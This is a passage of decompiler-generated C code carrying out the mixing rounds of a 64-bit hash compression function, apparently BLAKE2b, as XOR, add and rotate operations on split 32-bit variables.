    LODWORD(v21) = (__PAIR64__(v135, HIDWORD(v21)) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v135 ^ HIDWORD(v595)) >> 24) | v1172;
    v590 += __PAIR64__(HIDWORD(v595), v21) + v620;
    v984 = ((unsigned int)v605 ^ (unsigned int)v590) << 16;
    v768 = v605 ^ v590;
    v136 = (v605 ^ v590) >> 16;
    v137 = v136;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v590)) >> 16) | v984;
    v139 = v136 + HIDWORD(v21);
    v138 = (__PAIR64__(v21, v136) + __PAIR64__(HIDWORD(v600), HIDWORD(v21))) >> 32;
    v605 = __PAIR64__(v21, v137);
    HIDWORD(v600) = v138;
    v140 = __PAIR64__(v138, v139) ^ v595;
    LODWORD(v595) = (2 * (v139 ^ v595)) | ((v138 ^ HIDWORD(v595)) >> 31);
    v770 = 0;
    HIDWORD(v595) = v140 >> 31;
    v591 += v596 + v609;
    v1092 = v602 ^ v591;
    v141 = HIDWORD(v602) ^ HIDWORD(v591);
    v142 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v591, HIDWORD(v602) ^ HIDWORD(v591)) + v601;
    HIDWORD(v602) = v602 ^ v591;
    LODWORD(v21) = (v141 + v601) ^ v596;
    v986 = (_DWORD)v21 << 8;
    v772 = v21;
    LODWORD(v21) = __PAIR64__(HIDWORD(v142) ^ HIDWORD(v596), v21) >> 24;
    LODWORD(v596) = v21;
    v143 = __PAIR64__(((unsigned int)(HIDWORD(v142) ^ HIDWORD(v596)) >> 24) | v986, v21) + v612;
    HIDWORD(v596) = ((unsigned int)(HIDWORD(v142) ^ HIDWORD(v596)) >> 24) | v986;
    v591 += v143;
    v144 = v141 ^ v591;
    v774 = v144;
    v1146 = v144 << 16;
    v145 = __PAIR64__(HIDWORD(v602) ^ HIDWORD(v591), v144) >> 16;
    LODWORD(v602) = v145;
    HIDWORD(v602) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v591)) >> 16) | (v144 << 16);
    v601 = __PAIR64__(HIDWORD(v602), v145) + v142;
    v146 = (__PAIR64__(HIDWORD(v602), v145) + v142) ^ v596;
    LODWORD(v596) = (2 * ((v145 + v142) ^ v21)) | ((((__PAIR64__(HIDWORD(v602), v145) + v142) >> 32) ^ HIDWORD(v596)) >> 31);
    v776 = 0;
    HIDWORD(v596) = v146 >> 31;
    v592 += v597 + v613;
    v147 = HIDWORD(v603) ^ HIDWORD(v592);
    v988 = v603 ^ v592;
    v149 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v114, v115);
    v148 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v114, v115)) >> 32;
    HIDWORD(v603) = v603 ^ v592;
    v1094 = ((unsigned int)v149 ^ (unsigned int)v597) << 8;
    v778 = v149 ^ v597;
    LODWORD(v21) = (__PAIR64__(v148, v149) ^ v597) >> 24;
    LODWORD(v597) = v21;
    HIDWORD(v597) = ((v148 ^ HIDWORD(v597)) >> 24) | v1094;
    v150 = v21 + v607 + v592;
    LODWORD(v21) = (__PAIR64__(HIDWORD(v597), v21) + v607 + v592) >> 32;
    v592 = __PAIR64__(v21, v150);
    LODWORD(v21) = HIDWORD(v603) ^ v21;
    v780 = v147 ^ v150;
    v990 = (v147 ^ v150) << 16;
    v151 = __PAIR64__(v21, v147 ^ v150) >> 16;
    LODWORD(v21) = WORD1(v21) | v990;
    v153 = __PAIR64__(v21, v151) + __PAIR64__(v148, v149);
    v152 = (__PAIR64__(v21, v151) + __PAIR64__(v148, v149)) >> 32;
    v603 = __PAIR64__(v21, v151);
    v597 = (2 * (__PAIR64__(v152, v153) ^ v597)) | ((v152 ^ HIDWORD(v597)) >> 31);
    v782 = 0;
    v593 += v594 + v615;
    v154 = HIDWORD(v604) ^ HIDWORD(v593);
    v1186 = v604 ^ v593;
    v155 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593))
          + __PAIR64__(HIDWORD(v599), v121)) >> 32;
    HIDWORD(v18) = (HIDWORD(v604) ^ HIDWORD(v593)) + v121;
    HIDWORD(v604) = v604 ^ v593;
    HIDWORD(v599) = v155;
    v784 = HIDWORD(v18) ^ v594;
    v992 = (HIDWORD(v18) ^ (unsigned int)v594) << 8;
    LODWORD(v21) = (__PAIR64__(v155, HIDWORD(v18)) ^ v594) >> 24;
    LODWORD(v594) = v21;
    HIDWORD(v594) = ((v155 ^ HIDWORD(v594)) >> 24) | v992;
    v593 += __PAIR64__(HIDWORD(v594), v21) + v610;
    v156 = v154 ^ v593;
    v1096 = v156 << 16;
    v786 = v156;
    v157 = __PAIR64__(HIDWORD(v604) ^ HIDWORD(v593), v156) >> 16;
    v158 = v157;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v593)) >> 16) | v1096;
    v160 = v157 + HIDWORD(v18);
    v159 = (__PAIR64__(v21, v157) + __PAIR64__(HIDWORD(v599), HIDWORD(v18))) >> 32;
    v604 = __PAIR64__(v21, v158);
    HIDWORD(v599) = v159;
    v161 = __PAIR64__(v159, v160) ^ v594;
    LODWORD(v594) = (2 * (v160 ^ v594)) | ((v159 ^ HIDWORD(v594)) >> 31);
    v788 = 0;
    v590 += __PAIR64__(v161 >> 31, v594) + v613;
    v162 = HIDWORD(v602) ^ HIDWORD(v590);
    v994 = v602 ^ v590;
    v164 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v152, v153);
    v163 = (__PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v152, v153)) >> 32;
    HIDWORD(v602) = v602 ^ v590;
    LODWORD(v602) = v162;
    v1148 = ((unsigned int)v164 ^ (unsigned int)v594) << 8;
    v165 = v163 ^ (v161 >> 31);
    v790 = v164 ^ v594;
    LODWORD(v161) = v164 ^ v594;
    HIDWORD(v161) = v165;
    v166 = HIBYTE(v165) | v1148;
    LODWORD(v594) = v161 >> 24;
    HIDWORD(v594) = v166;
    v590 += __PAIR64__(v166, v594) + v615;
    v792 = v602 ^ v590;
    v996 = ((unsigned int)v602 ^ (unsigned int)v590) << 16;
    v167 = (v602 ^ v590) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v590)) >> 16) | v996;
    v169 = __PAIR64__(v21, v167) + __PAIR64__(v163, v164);
    v168 = (__PAIR64__(v21, v167) + __PAIR64__(v163, v164)) >> 32;
    v602 = __PAIR64__(v21, v167);
    v170 = __PAIR64__(v168, v169) ^ v594;
    LODWORD(v594) = (2 * (v169 ^ v594)) | ((v168 ^ v166) >> 31);
    v794 = 0;
    HIDWORD(v594) = v170 >> 31;
    v591 += v595 + v609;
    v1098 = v603 ^ v591;
    v171 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591))
          + __PAIR64__(HIDWORD(v599), v160)) >> 32;
    HIDWORD(v18) = (HIDWORD(v603) ^ HIDWORD(v591)) + v160;
    v603 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591));
    v796 = HIDWORD(v18) ^ v595;
    v998 = (HIDWORD(v18) ^ (unsigned int)v595) << 8;
    LODWORD(v595) = (__PAIR64__(v171, HIDWORD(v18)) ^ v595) >> 24;
    HIDWORD(v595) = ((v171 ^ HIDWORD(v595)) >> 24) | v998;
    v591 += v595 + v607;
    v798 = v603 ^ v591;
    v1174 = ((unsigned int)v603 ^ (unsigned int)v591) << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v591)) >> 16) | v1174;
    v173 = ((v603 ^ v591) >> 16) + HIDWORD(v18);
    v172 = (__PAIR64__(v21, (v603 ^ v591) >> 16) + __PAIR64__(v171, HIDWORD(v18))) >> 32;
    v603 = __PAIR64__(v21, (v603 ^ v591) >> 16);
    HIDWORD(v599) = v172;
    v174 = __PAIR64__(v172, v173) ^ v595;
    LODWORD(v595) = (2 * (v173 ^ v595)) | ((v172 ^ HIDWORD(v595)) >> 31);
    v800 = 0;
    HIDWORD(v595) = v174 >> 31;
    v592 += v596 + v619;
    v175 = HIDWORD(v604) ^ HIDWORD(v592);
    v1000 = v604 ^ v592;
    v176 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592))
          + __PAIR64__(HIDWORD(v600), v139)) >> 32;
    HIDWORD(v21) = (HIDWORD(v604) ^ HIDWORD(v592)) + v139;
    HIDWORD(v604) = v604 ^ v592;
    v802 = HIDWORD(v21) ^ v596;
    v1100 = (HIDWORD(v21) ^ (unsigned int)v596) << 8;
    LODWORD(v21) = (__PAIR64__(v176, HIDWORD(v21)) ^ v596) >> 24;
    LODWORD(v596) = v21;
    HIDWORD(v596) = ((v176 ^ HIDWORD(v596)) >> 24) | v1100;
    v592 += __PAIR64__(HIDWORD(v596), v21) + v618;
    v177 = v175 ^ v592;
    v804 = v177;
    v1002 = v177 << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v592)) >> 16) | (v177 << 16);
    v179 = (__PAIR64__(HIDWORD(v604) ^ HIDWORD(v592), v177) >> 16) + HIDWORD(v21);
    v178 = (__PAIR64__(v21, __PAIR64__(HIDWORD(v604) ^ HIDWORD(v592), v177) >> 16) + __PAIR64__(v176, HIDWORD(v21))) >> 32;
    v604 = __PAIR64__(v21, __PAIR64__(HIDWORD(v604) ^ HIDWORD(v592), v177) >> 16);
    HIDWORD(v600) = v178;
    v180 = __PAIR64__(v178, v179) ^ v596;
    LODWORD(v596) = (2 * (v179 ^ v596)) | ((v178 ^ HIDWORD(v596)) >> 31);
    v806 = 0;
    HIDWORD(v596) = v180 >> 31;
    v593 += v597 + v617;
    v181 = HIDWORD(v605) ^ HIDWORD(v593);
    v1150 = v605 ^ v593;
    LODWORD(v21) = v605 ^ v593;
    LODWORD(v605) = HIDWORD(v605) ^ HIDWORD(v593);
    HIDWORD(v605) = v21;
    v182 = v181 + v601;
    HIDWORD(v601) = (__PAIR64__(v21, v181) + v601) >> 32;
    LODWORD(v601) = v182;
    v808 = v182 ^ v597;
    v1004 = (v182 ^ (unsigned int)v597) << 8;
    LODWORD(v21) = (__PAIR64__(HIDWORD(v601), v182) ^ v597) >> 24;
    LODWORD(v597) = v21;
    v183 = __PAIR64__(((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 24) | v1004, v21) + v620;
    HIDWORD(v597) = ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 24) | v1004;
    v593 += v183;
    v810 = v605 ^ v593;
    v1102 = ((unsigned int)v605 ^ (unsigned int)v593) << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v593)) >> 16) | v1102;
    v184 = __PAIR64__(v21, (v605 ^ v593) >> 16) + v601;
    v605 = __PAIR64__(v21, (v605 ^ v593) >> 16);
    v185 = v184 ^ v597;
    LODWORD(v597) = (2 * (v184 ^ v597)) | ((unsigned int)(HIDWORD(v184) ^ HIDWORD(v597)) >> 31);
    v812 = 0;
    HIDWORD(v597) = v185 >> 31;
    v590 += v595 + v608;
    v186 = HIDWORD(v605) ^ HIDWORD(v590);
    v1006 = v605 ^ v590;
    v187 = (__PAIR64__((unsigned int)v605 ^ (unsigned int)v590, HIDWORD(v605) ^ HIDWORD(v590))
          + __PAIR64__(HIDWORD(v600), v179)) >> 32;
    HIDWORD(v21) = (HIDWORD(v605) ^ HIDWORD(v590)) + v179;
    HIDWORD(v605) = v605 ^ v590;
    v814 = HIDWORD(v21) ^ v595;
    v1196 = (HIDWORD(v21) ^ (unsigned int)v595) << 8;
    LODWORD(v21) = (__PAIR64__(v187, HIDWORD(v21)) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v187 ^ HIDWORD(v595)) >> 24) | v1196;
    v590 += __PAIR64__(HIDWORD(v595), v21) + v612;
    v188 = v186 ^ v590;
    v816 = v188;
    v1008 = v188 << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v590)) >> 16) | (v188 << 16);
    v190 = (__PAIR64__(HIDWORD(v605) ^ HIDWORD(v590), v188) >> 16) + HIDWORD(v21);
    v189 = (__PAIR64__(v21, __PAIR64__(HIDWORD(v605) ^ HIDWORD(v590), v188) >> 16) + __PAIR64__(v187, HIDWORD(v21))) >> 32;
    v605 = __PAIR64__(v21, __PAIR64__(HIDWORD(v605) ^ HIDWORD(v590), v188) >> 16);
    HIDWORD(v600) = v189;
    v191 = __PAIR64__(v189, v190) ^ v595;
    v818 = 0;
    LODWORD(v595) = (2 * (v190 ^ v595)) | ((v189 ^ HIDWORD(v595)) >> 31);
    HIDWORD(v595) = v191 >> 31;
    v591 += v596 + v611;
    v1104 = v602 ^ v591;
    v192 = HIDWORD(v602) ^ HIDWORD(v591);
    v193 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v591, HIDWORD(v602) ^ HIDWORD(v591)) + v184;
    HIDWORD(v602) = v602 ^ v591;
    LODWORD(v21) = (v192 + v184) ^ v596;
    v820 = v21;
    v1010 = (_DWORD)v21 << 8;
    LODWORD(v191) = v21;
    HIDWORD(v191) = HIDWORD(v193) ^ HIDWORD(v596);
    LODWORD(v596) = v191 >> 24;
    v194 = __PAIR64__(((unsigned int)(HIDWORD(v193) ^ HIDWORD(v596)) >> 24) | ((_DWORD)v21 << 8), v596) + v616;
    HIDWORD(v596) = ((unsigned int)(HIDWORD(v193) ^ HIDWORD(v596)) >> 24) | ((_DWORD)v21 << 8);
    v591 += v194;
    v195 = v192 ^ v591;
    v1152 = v195 << 16;
    v822 = v195;
    v196 = __PAIR64__(HIDWORD(v602) ^ HIDWORD(v591), v195) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v591)) >> 16) | (v195 << 16);
    v602 = __PAIR64__(v21, v196);
    v601 = __PAIR64__(v21, v196) + v193;
    v197 = (__PAIR64__(v21, v196) + v193) ^ v596;
    LODWORD(v596) = (2 * ((v196 + v193) ^ v596)) | ((((__PAIR64__(v21, v196) + v193) >> 32) ^ HIDWORD(v596)) >> 31);
    v824 = 0;
    HIDWORD(v596) = v197 >> 31;
    v592 += v597 + v610;
    v1012 = v603 ^ v592;
    v199 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v168, v169);
    v198 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v168, v169)) >> 32;
    v826 = v199 ^ v597;
    v603 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592));
    v1106 = ((unsigned int)v199 ^ (unsigned int)v597) << 8;
    LODWORD(v21) = (__PAIR64__(v198, v199) ^ v597) >> 24;
    LODWORD(v597) = v21;
    HIDWORD(v597) = ((v198 ^ HIDWORD(v597)) >> 24) | v1106;
    v592 += __PAIR64__(HIDWORD(v597), v21) + v606;
    v828 = v603 ^ v592;
    v1014 = ((unsigned int)v603 ^ (unsigned int)v592) << 16;
    v200 = (v603 ^ v592) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v592)) >> 16) | v1014;
    v202 = __PAIR64__(v21, v200) + __PAIR64__(v198, v199);
    v201 = (__PAIR64__(v21, v200) + __PAIR64__(v198, v199)) >> 32;
    v603 = __PAIR64__(v21, v200);
    v597 = (2 * (__PAIR64__(v201, v202) ^ v597)) | ((v201 ^ HIDWORD(v597)) >> 31);
    v830 = 0;
    v593 += v594 + v621;
    v1176 = v604 ^ v593;
    v203 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593))
          + __PAIR64__(HIDWORD(v599), v173)) >> 32;
    HIDWORD(v18) = (HIDWORD(v604) ^ HIDWORD(v593)) + v173;
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593));
    HIDWORD(v599) = v203;
    v832 = HIDWORD(v18) ^ v594;
    v1016 = (HIDWORD(v18) ^ (unsigned int)v594) << 8;
    LODWORD(v21) = (__PAIR64__(v203, HIDWORD(v18)) ^ v594) >> 24;
    LODWORD(v594) = v21;
    HIDWORD(v594) = ((v203 ^ HIDWORD(v594)) >> 24) | v1016;
    v593 += __PAIR64__(HIDWORD(v594), v21) + v614;
    v834 = v604 ^ v593;
    v1108 = ((unsigned int)v604 ^ (unsigned int)v593) << 16;
    v204 = (v604 ^ v593) >> 16;
    v205 = __PAIR64__(((unsigned int)(HIDWORD(v604) ^ HIDWORD(v593)) >> 16) | v1108, v204)
         + __PAIR64__(HIDWORD(v599), HIDWORD(v18));
    HIDWORD(v604) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v593)) >> 16) | v1108;
    v206 = v205 ^ v594;
    LODWORD(v594) = (2 * (v205 ^ v21)) | ((unsigned int)(HIDWORD(v205) ^ HIDWORD(v594)) >> 31);
    v836 = 0;
    v590 += __PAIR64__(v206 >> 31, v594) + v615;
    v207 = HIDWORD(v602) ^ HIDWORD(v590);
    v1018 = v602 ^ v590;
    v209 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v201, v202);
    v208 = (__PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v201, v202)) >> 32;
    HIDWORD(v602) = v602 ^ v590;
    LODWORD(v602) = v207;
    v838 = v209 ^ v594;
    v210 = v208 ^ (v206 >> 31);
    v1154 = ((unsigned int)v209 ^ (unsigned int)v594) << 8;
    LODWORD(v206) = v209 ^ v594;
    HIDWORD(v206) = v210;
    v211 = HIBYTE(v210) | v1154;
    LODWORD(v594) = v206 >> 24;
    HIDWORD(v594) = v211;
    v212 = __PAIR64__(v211, v594) + v606 + v590;
    v840 = v602 ^ v212;
    v1020 = ((unsigned int)v602 ^ (unsigned int)v212) << 16;
    v213 = v602 ^ v212;
    v215 = __PAIR64__(((unsigned int)((v602 ^ v212) >> 32) >> 16) | v1020, (v602 ^ v212) >> 16) + __PAIR64__(v208, v209);
    v214 = (__PAIR64__(((unsigned int)((v602 ^ v212) >> 32) >> 16) | v1020, (v602 ^ v212) >> 16) + __PAIR64__(
                                                                                                     v208,
                                                                                                     v209)) >> 32;
    HIDWORD(v602) = ((unsigned int)((v602 ^ v212) >> 32) >> 16) | v1020;
    LODWORD(v602) = v213 >> 16;
    v594 = (2 * (__PAIR64__(v214, v215) ^ v594)) | ((v214 ^ v211) >> 31);
    v842 = 0;
    v591 += v595 + v611;
    v1110 = v603 ^ v591;
    v216 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591)) + v205;
    v603 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591));
    v844 = v216 ^ v595;
    v1022 = ((unsigned int)v216 ^ (unsigned int)v595) << 8;
    LODWORD(v21) = (v216 ^ v595) >> 24;
    v217 = ((unsigned int)(HIDWORD(v216) ^ HIDWORD(v595)) >> 24) | v1022;
    LODWORD(v595) = v21;
    v218 = v21 + v613 + v591;
    LODWORD(v21) = (__PAIR64__(v217, v21) + v613 + v591) >> 32;
    v591 = __PAIR64__(v21, v218);
    v846 = v603 ^ v218;
    v1188 = ((unsigned int)v603 ^ v218) << 16;
    v219 = v603 ^ __PAIR64__(v21, v218);
    LODWORD(v21) = ((unsigned int)((v603 ^ __PAIR64__(v21, v218)) >> 32) >> 16) | v1188;
    HIDWORD(v18) = (v219 >> 16) + v216;
    HIDWORD(v603) = v21;
    LODWORD(v603) = v219 >> 16;
    HIDWORD(v599) = (__PAIR64__(v21, v603) + v216) >> 32;
    HIDWORD(v219) = HIDWORD(v599) ^ v217;
    LODWORD(v219) = HIDWORD(v18) ^ v595;
    LODWORD(v595) = (2 * (HIDWORD(v18) ^ v595)) | ((HIDWORD(v599) ^ v217) >> 31);
    v848 = 0;
    HIDWORD(v595) = v219 >> 31;
    v592 += v596 + v608;
    v1024 = v204 ^ v592;
    LODWORD(v21) = v204 ^ v592;
    v221 = (HIDWORD(v604) ^ HIDWORD(v592)) + v190;
    v220 = (__PAIR64__(v204 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592)) + __PAIR64__(HIDWORD(v600), v190)) >> 32;
    v604 = __PAIR64__(v21, HIDWORD(v604) ^ HIDWORD(v592));
    v850 = v221 ^ v596;
    v1112 = (v221 ^ (unsigned int)v596) << 8;
    LODWORD(v21) = (__PAIR64__(v220, v221) ^ v596) >> 24;
    LODWORD(v596) = v21;
    HIDWORD(v596) = ((v220 ^ HIDWORD(v596)) >> 24) | v1112;
    v592 += __PAIR64__(HIDWORD(v596), v21) + v610;
    v852 = v604 ^ v592;
    v1026 = ((unsigned int)v604 ^ (unsigned int)v592) << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v592)) >> 16) | v1026;
    v223 = ((v604 ^ v592) >> 16) + v221;
    v222 = (__PAIR64__(v21, (v604 ^ v592) >> 16) + __PAIR64__(v220, v221)) >> 32;
    v604 = __PAIR64__(v21, (v604 ^ v592) >> 16);
    HIDWORD(v600) = v222;
    v224 = __PAIR64__(v222, v223) ^ v596;
    LODWORD(v596) = (2 * (v223 ^ v596)) | ((v222 ^ HIDWORD(v596)) >> 31);
    v854 = 0;
    HIDWORD(v596) = v224 >> 31;
    v593 += v597 + v616;
    v225 = HIDWORD(v605) ^ HIDWORD(v593);
    v1156 = v605 ^ v593;
    v226 = (HIDWORD(v605) ^ HIDWORD(v593)) + v601;
    HIDWORD(v601) = (__PAIR64__((unsigned int)v605 ^ (unsigned int)v593, HIDWORD(v605) ^ HIDWORD(v593)) + v601) >> 32;
    HIDWORD(v605) = v605 ^ v593;
    LODWORD(v601) = v226;
    v856 = v226 ^ v597;
    v1028 = (v226 ^ (unsigned int)v597) << 8;
    LODWORD(v21) = (__PAIR64__(HIDWORD(v601), v226) ^ v597) >> 24;
    LODWORD(v597) = v21;
    v227 = __PAIR64__(((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 24) | v1028, v21) + v621;
    HIDWORD(v597) = ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 24) | v1028;
    v593 += v227;
    v228 = v225 ^ v593;
    v858 = v228;
    v1114 = v228 << 16;
    v229 = __PAIR64__(HIDWORD(v605) ^ HIDWORD(v593), v228) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v593)) >> 16) | (v228 << 16);
    v605 = __PAIR64__(v21, v229);
    v601 += __PAIR64__(v21, v229);
    v230 = v601 ^ v597;
    LODWORD(v597) = (2 * (v601 ^ v597)) | ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 31);
    v860 = 0;
    HIDWORD(v597) = v230 >> 31;
    v590 = v595 + v620 + v212;
    v1030 = v229 ^ v590;
    v232 = (v21 ^ HIDWORD(v590)) + v223;
    v231 = (__PAIR64__(v229 ^ (unsigned int)v590, (unsigned int)v21 ^ HIDWORD(v590)) + __PAIR64__(HIDWORD(v600), v223)) >> 32;
    HIDWORD(v605) = v605 ^ v590;
    LODWORD(v605) = v21 ^ HIDWORD(v590);
    v862 = v232 ^ v595;
    v1178 = (v232 ^ (unsigned int)v595) << 8;
    LODWORD(v21) = (__PAIR64__(v231, v232) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v231 ^ HIDWORD(v595)) >> 24) | v1178;
    v590 += __PAIR64__(HIDWORD(v595), v21) + v607;
    v864 = v605 ^ v590;
    v1032 = ((unsigned int)v605 ^ (unsigned int)v590) << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v590)) >> 16) | v1032;
    v234 = ((v605 ^ v590) >> 16) + v232;
    v233 = (__PAIR64__(v21, (v605 ^ v590) >> 16) + __PAIR64__(v231, v232)) >> 32;
    v605 = __PAIR64__(v21, (v605 ^ v590) >> 16);
    HIDWORD(v600) = v233;
    v235 = __PAIR64__(v233, v234) ^ v595;
    LODWORD(v595) = (2 * (v234 ^ v595)) | ((v233 ^ HIDWORD(v595)) >> 31);
    v866 = 0;
    HIDWORD(v595) = v235 >> 31;
    v591 += v596 + v617;
    v236 = HIDWORD(v602) ^ HIDWORD(v591);
    v1116 = v602 ^ v591;
    HIDWORD(v602) = v602 ^ v591;
    LODWORD(v21) = (v236 + v601) ^ v596;
    v601 += __PAIR64__((unsigned int)v602 ^ (unsigned int)v591, v236);
    v868 = v21;
    v1034 = (_DWORD)v21 << 8;
    LODWORD(v235) = v21;
    HIDWORD(v235) = HIDWORD(v601) ^ HIDWORD(v596);
    LODWORD(v596) = v235 >> 24;
    v237 = __PAIR64__(((unsigned int)(HIDWORD(v601) ^ HIDWORD(v596)) >> 24) | ((_DWORD)v21 << 8), v596) + v618;
    HIDWORD(v596) = ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v596)) >> 24) | ((_DWORD)v21 << 8);
    v591 += v237;
    v238 = v236 ^ v591;
    v1158 = v238 << 16;
    v870 = v238;
    v239 = __PAIR64__(HIDWORD(v602) ^ HIDWORD(v591), v238) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v591)) >> 16) | (v238 << 16);
    v602 = __PAIR64__(v21, v239);
    v601 += __PAIR64__(v21, v239);
    v240 = v601 ^ v596;
    LODWORD(v596) = (2 * (v601 ^ v596)) | ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v596)) >> 31);
    v872 = 0;
    HIDWORD(v596) = v240 >> 31;
    v592 += v597 + v612;
    v1036 = v603 ^ v592;
    v242 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v214, v215);
    v241 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v214, v215)) >> 32;
    v874 = v242 ^ v597;
    v603 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592));
    v1118 = ((unsigned int)v242 ^ (unsigned int)v597) << 8;
    LODWORD(v21) = (__PAIR64__(v241, v242) ^ v597) >> 24;
    LODWORD(v597) = v21;
    HIDWORD(v597) = ((v241 ^ HIDWORD(v597)) >> 24) | v1118;
    v592 += __PAIR64__(HIDWORD(v597), v21) + v614;
    v876 = v603 ^ v592;
    v1038 = ((unsigned int)v603 ^ (unsigned int)v592) << 16;
    v243 = (v603 ^ v592) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v592)) >> 16) | v1038;
    v245 = __PAIR64__(v21, v243) + __PAIR64__(v241, v242);
    v244 = (__PAIR64__(v21, v243) + __PAIR64__(v241, v242)) >> 32;
    v603 = __PAIR64__(v21, v243);
    v878 = 0;
    v597 = (2 * (__PAIR64__(v244, v245) ^ v597)) | ((v244 ^ HIDWORD(v597)) >> 31);
    v593 += v594 + v609;
    v1194 = v604 ^ v593;
    v246 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593))
          + __PAIR64__(HIDWORD(v599), HIDWORD(v18))) >> 32;
    HIDWORD(v18) += HIDWORD(v604) ^ HIDWORD(v593);
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593));
    v880 = HIDWORD(v18) ^ v594;
    v1040 = (HIDWORD(v18) ^ (unsigned int)v594) << 8;
    LODWORD(v21) = (__PAIR64__(v246, HIDWORD(v18)) ^ v594) >> 24;
    LODWORD(v594) = v21;
    HIDWORD(v594) = ((v246 ^ HIDWORD(v594)) >> 24) | v1040;
    v593 += __PAIR64__(HIDWORD(v594), v21) + v619;
    v1120 = ((unsigned int)v604 ^ (unsigned int)v593) << 16;
    v882 = v604 ^ v593;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v593)) >> 16) | v1120;
    v248 = ((v604 ^ v593) >> 16) + HIDWORD(v18);
    v247 = (__PAIR64__(v21, (v604 ^ v593) >> 16) + __PAIR64__(v246, HIDWORD(v18))) >> 32;
    v604 = __PAIR64__(v21, (v604 ^ v593) >> 16);
    HIDWORD(v599) = v247;
    v249 = __PAIR64__(v247, v248) ^ v594;
    LODWORD(v594) = (2 * (v248 ^ v594)) | ((v247 ^ HIDWORD(v594)) >> 31);
    v884 = 0;
    v590 += __PAIR64__(v249 >> 31, v594) + v608;
    v1042 = v602 ^ v590;
    v251 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v244, v245);
    v250 = (__PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v244, v245)) >> 32;
    v602 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590));
    v886 = v251 ^ v594;
    v1160 = ((unsigned int)v251 ^ (unsigned int)v594) << 8;
    v252 = v250 ^ (v249 >> 31);
    LODWORD(v249) = v251 ^ v594;
